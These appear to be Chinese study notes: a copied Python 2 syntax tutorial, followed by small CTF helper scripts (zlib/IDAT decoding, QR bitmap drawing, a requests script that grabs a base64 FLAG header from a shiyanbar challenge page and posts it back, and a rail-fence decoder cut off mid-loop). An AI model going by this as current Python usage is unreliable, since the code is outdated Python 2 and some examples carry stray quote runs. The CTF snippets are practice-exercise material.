#python编程常用知识点
循环
数组
选择
对象
输入输出
变量
对象
正则表达式
.*()
占位符与转义符


#python基础语法
Python 标识符
	在 Python 里，标识符由字母、数字、下划线组成。
	在 Python 中，所有标识符可以包括英文、数字以及下划线(_)，但不能以数字开头。
	Python 中的标识符是区分大小写的。
	以下划线开头的标识符是有特殊意义的。以单下划线开头 _foo 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入；
	以双下划线开头的 __foo 代表类的私有成员；以双下划线开头和结尾的 __foo__ 代表 Python 里特殊方法专用的标识，如 __init__() 代表类的构造函数。
	Python 可以同一行显示多条语句，方法是用分号 ; 分开

Python 保留字符
	下面的列表显示了在Python中的保留字。这些保留字不能用作常数或变数，或任何其他标识符名称。
	所有 Python 的关键字只包含小写字母。
		and			exec		not
		assert		finally		or
		break		for			pass
		class		from		print
		continue	global		raise
		def			if			return
		del			import		try
		elif		in			while
		else		is			with
		except		lambda		yield

行和缩进
	学习 Python 与其他语言最大的区别就是，Python 的代码块不使用大括号 {} 来控制类，函数以及其他逻辑判断。python 最具特色的就是用缩进来写模块。
	缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。每个缩进层次使用 单个制表符 或 两个空格 或 四个空格 , 切记不能混用

多行语句
	Python语句中一般以新行作为为语句的结束符。
	但是我们可以使用斜杠（ \）将一行的语句分为多行显示，如下所示：
		total = item_one + \
					item_two + \
					item_three
	语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：
		days = ['Monday', 'Tuesday', 'Wednesday',
				'Thursday', 'Friday']

Python 引号
	Python 可以使用引号( ' )、双引号( " )、三引号( ''' 或 """ ) 来表示字符串，引号的开始与结束必须的相同类型的。
	其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。
		word = 'word'
		sentence = "这是一个句子。"
		paragraph = """这是一个段落。
		包含了多个语句""""""

Python注释
	python中单行注释采用 # 开头。
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# 文件名：test.py

	# 第一个注释
	print "Hello, Python!";  # 第二个注释	
	
	注释可以在语句或表达式行末：
		name = "Madisetti" # 这是一个注释
	python 中多行注释使用三个单引号(''')或三个双引号(""")。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		# 文件名：test.py


		'''
		这是多行注释，使用单引号。
		这是多行注释，使用单引号。
		这是多行注释，使用单引号。
		'''

		"""
		这是多行注释，使用双引号。
		这是多行注释，使用双引号。
		这是多行注释，使用双引号。
		""""""'''
			
Python空行
	函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。
	空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。
	记住：空行也是程序代码的一部分。			
		
	等待用户输入
	下面的程序执行后就会等待用户输入，按回车键后就会退出：
	#!/usr/bin/python

	raw_input("\n\nPress the enter key to exit.")
	以上代码中 ，"\n\n"在结果输出前会输出两个新的空行。一旦用户按下 enter(回车) 键退出，其它键显示。	

同一行显示多条语句
	Python可以在同一行中使用多条语句，语句之间使用分号(;)分割，以下是一个简单的实例：
	#!/usr/bin/python

	import sys; x = 'runoob'; sys.stdout.write(x + '\n')

Print 输出
	print 默认输出是换行的，如果要实现不换行需要在变量末尾加上逗号：
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	x="a"
	y="b"
	# 换行输出
	print x
	print y

	print '---------'
	# 不换行输出
	print x,
	print y,

	# 不换行输出
	print x,y

多个语句构成代码组
	缩进相同的一组语句构成一个代码块，我们称之代码组。
	像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。
	我们将首行及后面的代码组称为一个子句(clause)。
	如下实例：
		if expression : 
		   suite 
		elif expression :  
		   suite  
		else :  
		   suite 

命令行参数
	很多程序可以执行一些操作来查看一些基本信息，Python 可以使用 -h 参数查看各参数帮助信息：
	$ python -h 
	usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ... 
	Options and arguments (and corresponding environment variables): 
	-c cmd : program passed in as string (terminates option list) 
	-d     : debug output from parser (also PYTHONDEBUG=x) 
	-E     : ignore environment variables (such as PYTHONPATH) 
	-h     : print this help message and exit 
	 
	[ etc. ] 
	我们在使用脚本形式执行 Python 时，可以接收命令行输入的参数，具体使用可以参照 Python 命令行参数。
	http://www.runoob.com/python/python-command-line-arguments.html

	
Python 变量类型
	变量存储在内存中的值。这就意味着在创建变量时会在内存中开辟一个空间。
	基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。
	因此，变量可以指定不同的数据类型，这些变量可以存储整数，小数或字符。

	变量赋值
	Python 中的变量赋值不需要类型声明。
	每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。
	每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。
	等号（=）用来给变量赋值。
	等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		counter = 100 # 赋值整型变量
		miles = 1000.0 # 浮点型
		name = "John" # 字符串
		 
		print counter
		print miles
		print name

多个变量赋值
	Python允许你同时为多个变量赋值。例如：
	a = b = c = 1
	以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。
	您也可以为多个对象指定多个变量。例如：
	a, b, c = 1, 2, "john"
	以上实例，两个整型对象1和2的分配给变量 a 和 b，字符串对象 "john" 分配给变量 c。

标准数据类型
	在内存中存储的数据可以有多种类型。
	例如，一个人的年龄可以用数字来存储，他的名字可以用字符来存储。
	Python 定义了一些标准类型，用于存储各种类型的数据。
	Python有五个标准的数据类型：
	Numbers（数字）
	String（字符串）
	List（列表）
	Tuple（元组）
	Dictionary（字典）

Python数字
	数字数据类型用于存储数值。
	他们是不可改变的数据类型，这意味着改变数字数据类型会分配一个新的对象。
	当你指定一个值时，Number对象就会被创建：
		var1 = 1
		var2 = 10
	您也可以使用del语句删除一些对象的引用。
		del语句的语法是：
		del var1[,var2[,var3[....,varN]]]]
	您可以通过使用del语句删除单个或多个对象的引用。例如：
		del var
		del var_a, var_b
	Python支持四种不同的数字类型：
		int（有符号整型）
		long（长整型[也可以代表八进制和十六进制]）
		float（浮点型）
		complex（复数）	
	一些数值类型的实例：
		int	long	float	complex
		10	51924361L	0.0	3.14j
		100	-0x19323L	15.20	45.j
		-786	0122L	-21.9	9.322e-36j
		080	0xDEFABCECBDAECBFBAEl	32.3e+18	.876j
		-0490	535633629843L	-90.	-.6545+0J
		-0x260	-052318172735L	-32.54e100	3e+26J
		0x69	-4721885298529L	70.2E-12	4.53e-7j
		长整型也可以使用小写 l，但是还是建议您使用大写 L，避免与数字 1 混淆。Python使用 L 来显示长整型。
		Python 还支持复数，复数由实数部分和虚数部分构成，可以用 a + bj,或者 complex(a,b) 表示， 复数的实部 a 和虚部 b 都是浮点型。

Python字符串
	字符串或串(String)是由数字、字母、下划线组成的一串字符。一般记为 :s="a1a2···an"(n>=0),它是编程语言中表示文本的数据类型。
	python的字串列表有2种取值顺序:
		从左到右索引默认0开始的，最大范围是字符串长度少1
		从右到左索引默认-1开始的，最大范围是字符串开头
	如果你要实现从字符串中获取一段子字符串的话，可以使用变量 [头下标:尾下标]，就可以截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。
		比如:
		s = 'ilovepython'
		s[1:5]的结果是love。
		当使用以冒号分隔的字符串，python返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。
		上面的结果包含了s[1]的值l，而取到的最大范围不包括上边界，就是s[5]的值p。
		加号（+）是字符串连接运算符，星号（*）是重复操作。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		str = 'Hello World!'
		 
		print str           # 输出完整字符串
		print str[0]        # 输出字符串中的第一个字符
		print str[2:5]      # 输出字符串中第三个至第五个之间的字符串
		print str[-2:-5]
		print str[2:]       # 输出从第三个字符开始的字符串
		print str * 2       # 输出字符串两次
		print str + "TEST"  # 输出连接的字符串	
		
Python列表
	List（列表） 是 Python 中使用最频繁的数据类型。
	列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。
	列表用 [ ] 标识，是 python 最通用的复合数据类型。
	列表中值的切割也可以用到变量 [头下标:尾下标] ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。
	加号 + 是列表连接运算符，星号 * 是重复操作。如下实例：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		list = [ 'runoob', 786 , 2.23, 'john', 70.2 ]
		tinylist = [123, 'john']
		 
		print list               # 输出完整列表
		print list[0]            # 输出列表的第一个元素
		print list[1:3]          # 输出第二个至第三个的元素 
		print list[2:]           # 输出从第三个开始至列表末尾的所有元素
		print tinylist * 2       # 输出列表两次
		print list + tinylist    # 打印组合的列表	
	
Python元组
	元组是另一个数据类型，类似于List（列表）。
	元组用"()"标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表(元组是不允许更新的。而列表是允许更新的)。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		tuple = ( 'runoob', 786 , 2.23, 'john', 70.2 )
		tinytuple = (123, 'john')
		 
		print tuple               # 输出完整元组
		print tuple[0]            # 输出元组的第一个元素
		print tuple[1:3]          # 输出第二个至第三个的元素 
		print tuple[2:]           # 输出从第三个开始至列表末尾的所有元素
		print tinytuple * 2       # 输出元组两次
		print tuple + tinytuple   # 打印组合的元组	
	
Python 字典
	字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象结合，字典是无序的对象集合。
	两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。
	字典用"{ }"标识。字典由索引(key)和它对应的值value组成。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		dict = {}
		dict['one'] = "This is one"
		dict[2] = "This is two"
		 
		tinydict = {'name': 'john','code':6734, 'dept': 'sales'}
		 
		 
		print dict['one']          # 输出键为'one' 的值
		print dict[2]              # 输出键为 2 的值
		print tinydict             # 输出完整的字典
		print tinydict.keys()      # 输出所有键
		print tinydict.values()    # 输出所有值	

Python数据类型转换
	有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。
	以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。
		函数							描述
		int(x [,base])			将x转换为一个整数
		long(x [,base] )		将x转换为一个长整数
		float(x)				将x转换到一个浮点数
		complex(real [,imag])	创建一个复数
		str(x)					将对象 x 转换为字符串
		repr(x)					将对象 x 转换为表达式字符串
		eval(str)				用来计算在字符串中的有效Python表达式,并返回一个对象
		tuple(s)				将序列 s 转换为一个元组
		list(s)					将序列 s 转换为一个列表
		set(s)					转换为可变集合
		dict(d)					创建一个字典。d 必须是一个序列 (key,value)元组。
		frozenset(s)			转换为不可变集合
		chr(x)					将一个整数转换为一个字符
		unichr(x)				将一个整数转换为Unicode字符
		ord(x)					将一个字符转换为它的整数值(ASCII码值)
		hex(x)					将一个整数转换为一个十六进制字符串
		oct(x)					将一个整数转换为一个八进制字符串

Python算术运算符
	以下假设变量： a=10，b=20：
	运算符	描述		实例
	+		加 		两个对象相加	a + b 输出结果 30
	-		减		得到负数或是一个数减去另一个数	a - b 输出结果 -10
	*		乘 		两个数相乘或是返回一个被重复若干次的字符串	a * b 输出结果 200
	/		除 		x除以y	b / a 输出结果 2
	%		取模	返回除法的余数	b % a 输出结果 0
	**		幂		返回x的y次幂	a**b 为10的20次方， 输出结果 100000000000000000000
	//		取整除	返回商的整数部分	9//2 输出结果 4 , 9.0//2.0 输出结果 4.0
	Python所有算术运算符的操作
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		c = a + b
		print "1 - c 的值为：", c
		 
		c = a - b
		print "2 - c 的值为：", c 
		 
		c = a * b
		print "3 - c 的值为：", c 
		 
		c = a / b
		print "4 - c 的值为：", c 
		 
		c = a % b
		print "5 - c 的值为：", c
		 
		# 修改变量 a 、b 、c
		a = 2
		b = 3
		c = a**b 
		print "6 - c 的值为：", c
		 
		a = 10
		b = 5
		c = a//b 
		print "7 - c 的值为：", c

		
Python比较运算符
	以下假设变量a为10，变量b为20：
	运算符	描述	实例
	==	等于 - 比较对象是否相等	(a == b) 返回 False。
	!=	不等于 - 比较两个对象是否不相等	(a != b) 返回 true.
	<>	不等于 - 比较两个对象是否不相等	(a <> b) 返回 true。这个运算符类似 != 。
	>	大于 - 返回x是否大于y	(a > b) 返回 False。
	<	小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。	(a < b) 返回 true。
	>=	大于等于	- 返回x是否大于等于y。	(a >= b) 返回 False。
	<=	小于等于 -	返回x是否小于等于y。	(a <= b) 返回 true。
	以下实例演示了Python所有比较运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		if ( a == b ):
		   print "1 - a 等于 b"
		else:
		   print "1 - a 不等于 b"
		 
		if ( a != b ):
		   print "2 - a 不等于 b"
		else:
		   print "2 - a 等于 b"
		 
		if ( a <> b ):
		   print "3 - a 不等于 b"
		else:
		   print "3 - a 等于 b"
		 
		if ( a < b ):
		   print "4 - a 小于 b" 
		else:
		   print "4 - a 大于等于 b"
		 
		if ( a > b ):
		   print "5 - a 大于 b"
		else:
		   print "5 - a 小于等于 b"
		 
		# 修改变量 a 和 b 的值
		a = 5
		b = 20
		if ( a <= b ):
		   print "6 - a 小于等于 b"
		else:
		   print "6 - a 大于  b"
		 
		if ( b >= a ):
		   print "7 - b 大于等于 a"
		else:
		   print "7 - b 小于 a"		

		   
Python赋值运算符
	以下假设变量a为10，变量b为20：
	运算符	描述	实例
	=	简单的赋值运算符	c = a + b 将 a + b 的运算结果赋值为 c
	+=	加法赋值运算符	c += a 等效于 c = c + a
	-=	减法赋值运算符	c -= a 等效于 c = c - a
	*=	乘法赋值运算符	c *= a 等效于 c = c * a
	/=	除法赋值运算符	c /= a 等效于 c = c / a
	%=	取模赋值运算符	c %= a 等效于 c = c % a
	**=	幂赋值运算符	c **= a 等效于 c = c ** a
	//=	取整除赋值运算符	c //= a 等效于 c = c // a
	以下实例演示了Python所有赋值运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		c = a + b
		print "1 - c 的值为：", c
		 
		c += a
		print "2 - c 的值为：", c 
		 
		c *= a
		print "3 - c 的值为：", c 
		 
		c /= a 
		print "4 - c 的值为：", c 
		 
		c = 2
		c %= a
		print "5 - c 的值为：", c
		 
		c **= a
		print "6 - c 的值为：", c
		 
		c //= a
		print "7 - c 的值为：", c


Python位运算符
	运算符	描述	实例
	&	按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0	(a & b) 输出结果 12 ，二进制解释： 0000 1100
	|	按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。	(a | b) 输出结果 61 ，二进制解释： 0011 1101
	^	按位异或运算符：当两对应的二进位相异时，结果为1	(a ^ b) 输出结果 49 ，二进制解释： 0011 0001
	~	按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1	(~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。
	<<	左移动运算符：运算数的各二进位全部左移若干位，由"<<"右边的数指定移动的位数，高位丢弃，低位补0。	a << 2 输出结果 240 ，二进制解释： 1111 0000
	>>	右移动运算符：把">>"左边的运算数的各二进位全部右移若干位，">>"右边的数指定移动的位数	a >> 2 输出结果 15 ，二进制解释： 0000 1111
	以下实例演示了Python所有位运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 60            # 60 = 0011 1100 
		b = 13            # 13 = 0000 1101 
		c = 0
		 
		c = a & b;        # 12 = 0000 1100
		print "1 - c 的值为：", c
		 
		c = a | b;        # 61 = 0011 1101 
		print "2 - c 的值为：", c
		 
		c = a ^ b;        # 49 = 0011 0001
		print "3 - c 的值为：", c
		 
		c = ~a;           # -61 = 1100 0011
		print "4 - c 的值为：", c
		 
		c = a << 2;       # 240 = 1111 0000
		print "5 - c 的值为：", c
		 
		c = a >> 2;       # 15 = 0000 1111
		print "6 - c 的值为：", c


Python逻辑运算符
	Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:
	运算符	逻辑表达式	描述	实例
	and	x and y	布尔"与" - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。	(a and b) 返回 20。
	or	x or y	布尔"或"	- 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。	(a or b) 返回 10。
	not	not x	布尔"非" - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。	not(a and b) 返回 False
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 10
		b = 20
		 
		if ( a and b ):
		   print "1 - 变量 a 和 b 都为 true"
		else:
		   print "1 - 变量 a 和 b 有一个不为 true"
		 
		if ( a or b ):
		   print "2 - 变量 a 和 b 都为 true，或其中一个变量为 true"
		else:
		   print "2 - 变量 a 和 b 都不为 true"
		 
		# 修改变量 a 的值
		a = 0
		if ( a and b ):
		   print "3 - 变量 a 和 b 都为 true"
		else:
		   print "3 - 变量 a 和 b 有一个不为 true"
		 
		if ( a or b ):
		   print "4 - 变量 a 和 b 都为 true，或其中一个变量为 true"
		else:
		   print "4 - 变量 a 和 b 都不为 true"
		 
		if not( a and b ):
		   print "5 - 变量 a 和 b 都为 false，或其中一个变量为 false"
		else:
		   print "5 - 变量 a 和 b 都为 true"


Python成员运算符
	除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。
	运算符	描述	实例
	in	如果在指定的序列中找到值返回 True，否则返回 False。	x 在 y 序列中 , 如果 x 在 y 序列中返回 True。
	not in	如果在指定的序列中没有找到值返回 True，否则返回 False。	x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。
	以下实例演示了Python所有成员运算符的操作：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 10
		b = 20
		list = [1, 2, 3, 4, 5 ];
		 
		if ( a in list ):
		   print "1 - 变量 a 在给定的列表中 list 中"
		else:
		   print "1 - 变量 a 不在给定的列表中 list 中"
		 
		if ( b not in list ):
		   print "2 - 变量 b 不在给定的列表中 list 中"
		else:
		   print "2 - 变量 b 在给定的列表中 list 中"
		 
		# 修改变量 a 的值
		a = 2
		if ( a in list ):
		   print "3 - 变量 a 在给定的列表中 list 中"
		else:
		   print "3 - 变量 a 不在给定的列表中 list 中"


Python身份运算符
	身份运算符用于比较两个对象的存储单元
	运算符	描述	实例
	is	is 是判断两个标识符是不是引用自一个对象	x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False
	is not	is not 是判断两个标识符是不是引用自不同对象	x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。
	注： id() 函数用于获取对象内存地址。
	is 与 == 区别：
		is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等。
	以下实例演示了Python所有身份运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 20
		b = 20
		 
		if ( a is b ):
		   print "1 - a 和 b 有相同的标识"
		else:
		   print "1 - a 和 b 没有相同的标识"
		 
		if ( a is not b ):
		   print "2 - a 和 b 没有相同的标识"
		else:
		   print "2 - a 和 b 有相同的标识"
		 
		# 修改变量 b 的值
		b = 30
		if ( a is b ):
		   print "3 - a 和 b 有相同的标识"
		else:
		   print "3 - a 和 b 没有相同的标识"
		 
		if ( a is not b ):
		   print "4 - a 和 b 没有相同的标识"
		else:
		   print "4 - a 和 b 有相同的标识"

Python运算符优先级
	以下表格列出了从最高到最低优先级的所有运算符：
	运算符	描述
	**	指数 (最高优先级)
	~ + -	按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)
	* / % //	乘，除，取模和取整除
	+ -	加法减法
	>> <<	右移，左移运算符
	&	位 'AND'
	^ |	位运算符
	<= < > >=	比较运算符
	<> == !=	等于运算符
	= %= /= //= -= += *= **=	赋值运算符
	is is not	身份运算符
	in not in	成员运算符
	not or and	逻辑运算符
	以下实例演示了Python所有运算符优先级的操作：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 20
		b = 10
		c = 15
		d = 5
		e = 0
		 
		e = (a + b) * c / d       #( 30 * 15 ) / 5
		print "(a + b) * c / d 运算结果为：",  e
		 
		e = ((a + b) * c) / d     # (30 * 15 ) / 5
		print "((a + b) * c) / d 运算结果为：",  e
		 
		e = (a + b) * (c / d);    # (30) * (15/5)
		print "(a + b) * (c / d) 运算结果为：",  e
		 
		e = a + (b * c) / d;      #  20 + (150/5)
		print "a + (b * c) / d 运算结果为：",  e

		
Python 条件语句
	Python条件语句是通过一条或多条语句的执行结果（True或者False）来决定执行的代码块。
	Python程序语言指定任何非0和非空（null）值为true，0 或者 null为false。
	Python 编程中 if 语句用于控制程序的执行，基本形式为：
		if 判断条件：
			执行语句……
		else：
			执行语句……
	其中"判断条件"成立时（非零），则执行后面的语句，而执行内容可以多行，以缩进来区分表示同一范围。
	else 为可选语句，当需要在条件不成立时执行内容则可以执行相关语句，具体例子如下：
	实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		# 例1：if 基本用法
		 
		flag = False
		name = 'luren'
		if name == 'python':         # 判断变量否为'python'
			flag = True          # 条件成立时设置标志为真
			print 'welcome boss'    # 并输出欢迎信息
		else:
			print name              # 条件不成立时输出变量名称

	if 语句的判断条件可以用>（大于）、<(小于)、==（等于）、>=（大于等于）、<=（小于等于）来表示其关系。
	当判断条件为多个值时，可以使用以下形式：
		if 判断条件1:
			执行语句1……
		elif 判断条件2:
			执行语句2……
		elif 判断条件3:
			执行语句3……
		else:
			执行语句4……			
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		# 例2：elif用法
		 
		num = 5     
		if num == 3:            # 判断num的值
			print 'boss'        
		elif num == 2:
			print 'user'
		elif num == 1:
			print 'worker'
		elif num < 0:           # 值小于零时输出
			print 'error'
		else:
			print 'roadman'     # 条件均不成立时输出
			
	由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。
	实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		# 例3：if语句多个条件
		 
		num = 9
		if num >= 0 and num <= 10:    # 判断值是否在0~10之间
			print 'hello'
		# 输出结果: hello
		 
		num = 10
		if num < 0 or num > 10:    # 判断值是否在小于0或大于10
			print 'hello'
		else:
			print 'undefine'
		# 输出结果: undefine
		 
		num = 8
		# 判断值是否在0~5或者10~15之间
		if (num >= 0 and num <= 5) or (num >= 10 and num <= 15):    
			print 'hello'
		else:
			print 'undefine'
		# 输出结果: undefine
		当if有多个条件时可使用括号来区分判断的先后顺序，括号中的判断优先执行，此外 and 和 or 的优先级低于>（大于）、<（小于）等判断符号，即大于和小于在没有括号的情况下会比与或要优先判断。

	简单的语句组
		你也可以在同一行的位置上使用if条件判断语句，如下实例：
		实例
		#!/usr/bin/python 
		# -*- coding: UTF-8 -*-
		 
		var = 100 
		 
		if ( var  == 100 ) : print "变量 var 的值为100" 
		 
		print "Good bye!"
	

Python 循环语句
	循环语句允许我们执行一个语句或语句组多次
	Python提供了for循环和while循环（在Python中没有do..while循环）:
		循环类型	描述
		while 循环	在给定的判断条件为 true 时执行循环体，否则退出循环体。
		for 循环	重复执行语句
		嵌套循环	你可以在while循环体中嵌套for循环

	循环控制语句
		循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：
		控制语句	描述
		break 语句	在语句块执行过程中终止循环，并且跳出整个循环
		continue 语句	在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。
		pass 语句	pass是空语句，是为了保持程序结构的完整性。
	
Python While 循环语句
		Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。其基本形式为：
			while 判断条件：
				执行语句……
		执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（null）的值均为true。
		当判断条件假false时，循环结束。
			#!/usr/bin/python
		 
			count = 0
			while (count < 9):
			   print 'The count is:', count
			   count = count + 1
			 
			print "Good bye!"

	循环控制
		while 语句时还有另外两个重要的命令 continue，break 来跳过循环，continue 用于跳过该次循环，break 则是用于退出循环，此外"判断条件"还可以是个常值，表示循环必定成立，具体用法如下：
		# continue 和 break 用法
		 
		i = 1
		while i < 10:   
			i += 1
			if i%2 > 0:     # 非双数时跳过输出
				continue
			print i         # 输出双数2、4、6、8、10
		 
		i = 1
		while 1:            # 循环条件为1必定成立
			print i         # 输出1~10
			i += 1
			if i > 10:     # 当i大于10时跳出循环
				break
				
	无限循环
		如果条件判断语句永远为 true，循环将会无限的执行下去，如下实例：
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		var = 1
		while var == 1 :  # 该条件永远为true，循环将无限执行下去
		   num = raw_input("Enter a number  :")
		   print "You entered: ", num
		 
		print "Good bye!"

	循环使用 else 语句
		在 python 中，while … else 在循环条件为 false 时执行 else 语句块：
		实例
		#!/usr/bin/python
		 
		count = 0
		while count < 5:
		   print count, " is  less than 5"
		   count = count + 1
		else:
		   print count, " is not less than 5"
		   
	简单语句组
		类似 if 语句的语法，如果你的 while 循环体中只有一条语句，你可以将该语句与while写在同一行中， 如下所示：
		实例
		#!/usr/bin/python
		 
		flag = 1
		 
		while (flag): print 'Given flag is really true!'
		 
		print "Good bye!"

Python for 循环语句
	Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。
	语法：
	for循环的语法格式如下：
	for iterating_var in sequence:
	   statements(s)
	实例  
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		for letter in 'Python':     # 第一个实例
		   print '当前字母 :', letter
		 
		fruits = ['banana', 'apple',  'mango']
		for fruit in fruits:        # 第二个实例
		   print '当前水果 :', fruit
		 
		print "Good bye!"

	通过序列索引迭代
		另外一种执行循环的遍历方式是通过索引，如下实例：
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		fruits = ['banana', 'apple',  'mango']
		for index in range(len(fruits)):
		   print '当前水果 :', fruits[index]
		 
		print "Good bye!"
		#内置函数 len() 和 range(),函数 len() 返回列表的长度，即元素的个数。 range返回一个范围内的列表
	
	循环使用 else 语句
		在 python 中，for … else 表示这样的意思，for 中的语句和普通的没有区别，else 中的语句会在循环正常执行完（即 for 不是通过 break 跳出而中断的）的情况下执行，while … else 也是一样。
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		for num in range(10,20):  # 迭代 10 到 20 之间的数字
		   for i in range(2,num): # 根据因子迭代
			  if num%i == 0:      # 确定第一个因子
				 j=num/i          # 计算第二个因子
				 print '%d 等于 %d * %d' % (num,i,j)
				 break            # 跳出当前循环
		   else:                  # 循环的 else 部分
			  print num, '是一个质数'











	
#python demo "hello world"
{
#!/usr/bin/python
# -*- coding: UTF-8 -*-
#coding=utf-8
# 文件名：test.py
print "Hello, World!";
print "你好，妹子";
}











#zip解压缩及16进制编码
{
#! /usr/bin/env python
import zlib
import binascii
IDAT = "789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667".decode('hex')
#print IDAT
result = binascii.hexlify(zlib.decompress(IDAT))      
print result
#print result.decode('hex')
}



#PPL编程（画图）
{
#!/usr/bin/env python
import Image
MAX = 25
pic = Image.new("RGB",(MAX, MAX))
str = "1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011"
i=0
for y in range (0,MAX):
	for x in range (0,MAX):
		if(str[i] == '1'):
			pic.putpixel([x,y],(0, 0, 0))
		else:
			pic.putpixel([x,y],(255,255,255))
		i = i+1
pic.show()
pic.save("flag.png")     
}



#base64编解码，get/post请求
{
import requests, base64

rsp = requests.get('http://ctf5.shiyanbar.com/web/10/10.php')
tmp = base64.b64decode(rsp.headers['FLAG']).split(':')
rsp = requests.post('http://ctf5.shiyanbar.com/web/10/10.php', data={'key':tmp[-1]})
print rsp.text      
}



#栅栏密码破解
{
#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Author: 蔚蓝行
# http://www.cnblogs.com/duanv
e = raw_input('请输入要解密的字符串\n')
elen = len(e)
field=[]
for i in range(2,elen):
            if(elen%i==0):
                field.append(i)

for f in field:
    b = elen / f
    result = {x:'' for x in range(b)}
    for i in range(elen):
        a = i % b;
